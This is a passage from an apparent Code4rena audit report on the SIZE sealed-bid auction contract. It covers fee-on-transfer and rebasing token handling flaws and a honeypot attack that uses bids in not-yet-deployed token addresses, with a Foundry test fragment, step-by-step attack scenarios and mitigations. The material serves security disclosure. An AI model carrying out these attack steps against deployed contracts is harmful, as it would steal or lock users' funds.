quoteAmount tokens of quoteToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (balance_quote, balance_base) = attacker_seller.balances();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;End seller balance: &quot;, balance_quote, balance_base);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (balance_quote, balance_base) = attacker_buyer.balances();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&#39;End buyer balance: &#39;, balance_quote, balance_base);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, foundry tests</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Do not trust the value of <code>lowestQuote</code> when determining the finalize state, use a dedicated state variable for it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/252#issuecomment-1316061426\">RagePit (SIZE) confirmed</a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-7\" style=\"position:relative;\"><a href=\"#medium-risk-findings-7\" aria-label=\"medium risk findings 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (7)</h1>\n<h2 id=\"m-01-incompatibility-with-fee-on-transferinflationarydeflationaryrebasing-tokens-on-both-base-tokens-and-quote-tokens-with-varying-impacts\" style=\"position:relative;\"><a href=\"#m-01-incompatibility-with-fee-on-transferinflationarydeflationaryrebasing-tokens-on-both-base-tokens-and-quote-tokens-with-varying-impacts\" aria-label=\"m 01 incompatibility with fee on transferinflationarydeflationaryrebasing tokens on both base tokens and quote tokens with varying impacts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/47\">[M-01] Incompatibility with fee-on-transfer/inflationary/deflationary/rebasing tokens, on both base tokens and quote tokens, with varying impacts</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/47\">neko_nyaa</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/250\">_141345_</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/23\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/235\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/137\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/205\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/19\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/206\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/79\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/98\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/145\">horsefacts</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/301\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/87\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/17\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/63\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/220\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/300\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/73\">R2</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/9\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/55\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/116\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/316\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/223\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/169\">tonisives</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/255\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/221\">TwelveSec</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/226\">wagmi</a>.</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105</a></p>\n<p>The following report describes two issues with how the <code>SizeSealed</code> contract incorrectly handles several so-called “weird ERC20” tokens, in which the token’s balance can change unexpectedly:</p>\n<ul>\n<li>How the contract cannot handle fee-on-transfer base tokens, and</li>\n<li>How the contract incorrectly handles unusual ERC20 tokens in general, with stated impact.</li>\n</ul>\n<h4 id=\"base-tokens\" style=\"position:relative;\"><a href=\"#base-tokens\" aria-label=\"base tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Base tokens</h4>\n<p>Let us first note how the contract attempts to handle sudden balance change to the <code>baseToken</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBeforeTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalBaseAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfterTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balanceAfterTransfer</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBeforeTransfer</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UnexpectedBalanceChange</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The effect is that the operation will revert with the error <code>UnexpectedBalanceChange()</code> if the received amount is different from what was transferred.</p>\n<h4 id=\"quote-tokens\" style=\"position:relative;\"><a href=\"#quote-tokens\" aria-label=\"quote tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quote tokens</h4>\n<p>Unlike base tokens, there is no such check when transferring the <code>quoteToken</code> from the bidder:</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Since <a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L150\">line 150</a> stores the <code>quoteAmount</code> as a state variable, which will be used later on during outgoing transfers (see following lines), this results in incorrect state handling.</p>\n<p>It is worth noting that this will effect <strong>all</strong> functions with outgoing transfers, due to reliance on storage values.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L327\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L327</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L351\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L351</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L381\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L381</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L439\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L439</a></li>\n</ul>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>Consider the following scenario, describing the issue with both token types:</p>\n<ol>\n<li>Alice places an auction, her base token is a rebasing token (e.g. aToken from Aave).</li>\n<li>Bob places a bid with <code>1e18</code> quote tokens. This quote token turns out to be a fee-on-transfer token, and the contract actually received <code>1e18 - fee</code>.</li>\n<li>Some time later, Alice cancels the auction and withdraws her aTokens.</li>\n<li>Bob is now unable to withdraw his bid, due to failed transfers for the contract not having enough balance.</li>\n</ol>\n<p>For Alice’s situation, she is able to recover her original amount. However, since aTokens increases one’s own balance over time, the “interest” amount is permanently locked in the contract.</p>\n<p>Bob’s situation is somewhat more recoverable, as he can simply send more tokens to the contract itself, so that the contract’s balance is sufficient to refund Bob his tokens. However, given that Bob now has to incur more transfer fees to get his own funds back, I consider this a leakage of value.</p>\n<p>It is worth noting that similar impacts <strong>will happen to successful auctions</strong> as well, although it is a little more complicated, and that it varies in the matter of who is affected.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>For the base token:</p>\n<ul>\n<li>\n<p>For fee-on-transfer tokens, the contract is simply unusable on these tokens.</p>\n<ul>\n<li>There exists <a href=\"https://github.com/d-xo/weird-erc20#fee-on-transfer\">many</a> popular fee-on-transfer tokens, and potential tokens where the fees may be switched on in the future.</li>\n</ul>\n</li>\n<li>For rebasing tokens, part of the funds may be permanently locked in the contract.</li>\n</ul>\n<p>For the quote token:</p>\n<ul>\n<li>\n<p>If the token is a fee-on-transfer, or anything that results in the contract holding lower amount than stored, then this actually results in a denial-of-service, since outgoing transfers in e.g. <code>withdraw()</code> will fail due to insufficient balance.</p>\n<ul>\n<li>This may get costly to recover if a certain auction is popular, but is cancelled, so the last bidder to withdraw takes all the damage.</li>\n<li>This can also be considered fund loss due to quote tokens getting stuck in the contract.</li>\n</ul>\n</li>\n<li>For rebasing tokens, part of the funds may be permanently locked in the contract (same effect as base token).</li>\n</ul>\n<h3 id=\"remarks\" style=\"position:relative;\"><a href=\"#remarks\" aria-label=\"remarks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remarks</h3>\n<p>While technically two separate issues are described, they do have many overlappings, and both comes down to correct handling of unusual ERC20 tokens, hence I have decided to combine these into a single report.</p>\n<p>Another intention was to highlight the similarities and differences between balance handling of base tokens and quote tokens, which actually has given rise to part of the issue itself.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For both issues:</p>\n<ul>\n<li>Consider warning the users about the possibility of fund loss when using rebasing tokens as the quote token.</li>\n<li>Adding ERC20 recovering functions is an option, however this should be done carefully, so as not to accidentally pull out base or quote tokens from ongoing auctions.</li>\n</ul>\n<p>For the base token issue:</p>\n<ul>\n<li>\n<p>Consider using two parameters for transferring base tokens: e.g. <code>amountToTransferIn</code> for the amount to be pulled in, and <code>auctionParams.totalBaseAmount</code> for the actual amount received, then check the received amount is appropriate.</p>\n<ul>\n<li>The calculation for these two amount should be the auction creator’s responsibility, however this can be made a little easier for them by checking amount received is at least <code>auctionParams.totalBaseAmount</code> instead of exact, and possibly transferring the surplus amount back to the creator.</li>\n</ul>\n</li>\n</ul>\n<p>For the quote token issue:</p>\n<ul>\n<li>Consider adding a check for <code>quoteAmount</code> to be correctly transferred, or check the actual amount transferred in the contract instead of using the function parameter, or something similar to the base token’s mitigation.</li>\n</ul>\n<p>Additionally, consider using a separate internal function for pulling tokens, to ensure correct transfers.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1308961688\">0xean (judge) commented on duplicate issue #255</a>:</strong></p>\n<blockquote>\n<p>debating between M and H on this one. Currently leaning towards H since there is a direct loss of funds and no documentation stating these types of tokens aren’t supported (nor checks to disable them).</p>\n<p>using this issue to gather all of the various manifestations of “special” ERC20 tokens not being supported. While rebasing tokens would need to be handled differently than fee on transfer, the underlying issue is close enough to not separate them all out</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1321291800\">Ragepit (SIZE) confirmed duplicate issue #255</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1335312641\">0xean (judge) commented on duplicate issue #255</a>:</strong></p>\n<blockquote>\n<p>Thought about this one more and look back at some similar past findings from myself and other judges and feel that M is the correct severity here.\n<a href=\"code-423n4/org#3\">code-423n4/org#3</a> for a conversation on the topic.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-solmates-erc20-does-not-check-for-token-contracts-existence-which-opens-up-possibility-for-a-honeypot-attack\" style=\"position:relative;\"><a href=\"#m-02-solmates-erc20-does-not-check-for-token-contracts-existence-which-opens-up-possibility-for-a-honeypot-attack\" aria-label=\"m 02 solmates erc20 does not check for token contracts existence which opens up possibility for a honeypot attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/48\">[M-02] Solmate’s ERC20 does not check for token contract’s existence, which opens up possibility for a honeypot attack</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/48\">neko_nyaa</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/45\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/72\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/318\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/33\">ctf_sec</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/309\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/146\">horsefacts</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/231\">jayphbee</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/268\">Matin</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/222\">TwelveSec</a>.</em></p>\n<p>When bidding, the contract pulls the quote token from the bidder to itself.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, since the contract uses Solmate’s <a href=\"https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\">SafeTransferLib</a></p>\n<blockquote>\n<p>/// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.</p>\n</blockquote>\n<p>Therefore if the token address is empty, the transfer will succeed silently, but not crediting the contract with any tokens.</p>\n<p>This error opens up room for a honeypot attack similar to the <a href=\"https://halborn.com/explained-the-qubit-hack-january-2022/\">Qubit Finance hack</a> in January 2022.</p>\n<p>In particular, it has became popular for protocols to deploy their token across multiple networks using the same deploying address, so that they can control the address nonce and ensuring a consistent token address across different networks.</p>\n<p>E.g. <strong>1INCH</strong> has the same token address on Ethereum and BSC, and GEL token has the same address on Ethereum, Fantom and Polygon. There are other protocols have same contract addresses across different chains, and it’s not hard to imagine such thing for their protocol token too, if any.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assuming that Alice is the attacker, Bob is the victim. Alice has two accounts, namely Alice1 and Alice2. Denote token Q as the quote token.</p>\n<ol start=\"0\">\n<li><strong>Token Q has been launched on other chains, but not on the local chain yet.</strong> It is expected that token Q will be launched on the local chain with a consistent address as other chains.</li>\n<li>Alice1 places an auction with some <code>baseToken</code>, and a token Q as the <code>quoteToken</code>.</li>\n<li>\n<p>Alice2 places a bid with <code>1000e18</code> quote tokens.</p>\n<ul>\n<li>The transfer succeeds, but the contract is not credited any tokens.</li>\n</ul>\n</li>\n<li><strong>Token Q is launched on the local chain.</strong></li>\n<li>Bob places a bid with <code>1001e18</code> quote tokens.</li>\n<li>Alice2 cancels her own bid, recovering her (supposedly) <code>1000e18</code> refund bid back.</li>\n<li>Alice1 cancels her auction, recovering her base tokens back.</li>\n</ol>\n<p>As a result, the contract’s Q token balance is <code>1e18</code>, Alice gets 